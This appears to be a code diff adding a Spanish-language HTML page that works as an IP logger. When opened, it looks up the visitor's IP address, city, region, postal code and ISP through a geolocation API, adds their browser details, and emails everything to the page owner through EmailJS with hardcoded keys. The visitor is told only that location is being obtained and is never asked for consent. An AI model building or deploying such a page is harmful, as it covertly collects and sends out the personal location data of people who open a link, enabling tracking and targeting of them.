@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Localización y envío de Email</title>
+</head>
+<body>
+  <h1>Obteniendo ubicación...</h1>
+
+  <script type="module">
+    import emailjs from 'https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js';
+
+    emailjs.init("eXYLcXcMEURtAb1ii"); // Tu Public Key
+
+    fetch('https://ipapi.co/json/')
+      .then(res => res.json())
+      .then(data => {
+        const locationInfo = `
+IP: ${data.ip}
+Ciudad: ${data.city}
+Región: ${data.region}
+País: ${data.country_name}
+Código postal: ${data.postal}
+ISP: ${data.org}
+Fecha y hora: ${new Date().toLocaleString()}
+Navegador: ${navigator.userAgent}
+Idioma: ${navigator.language}
+        `;
+
+        emailjs.send("service_zbmzrhc", "template_fxnjdv1", {
+          message: locationInfo
+        })
+        .then(() => {
+          document.body.innerHTML += "<p>Email enviado con éxito.</p>";
+        })
+        .catch((err) => {
+          console.error("Error al enviar:", err);
+          document.body.innerHTML += "<p>Error al enviar el email: " + JSON.stringify(err) + "</p>";
+        });
+      })
+      .catch(err => {
+        console.error("Error obteniendo IP:", err);
+        document.body.innerHTML += "<p>Error obteniendo IP.</p>";
+      });
+  </script>
+</body>
+</html>
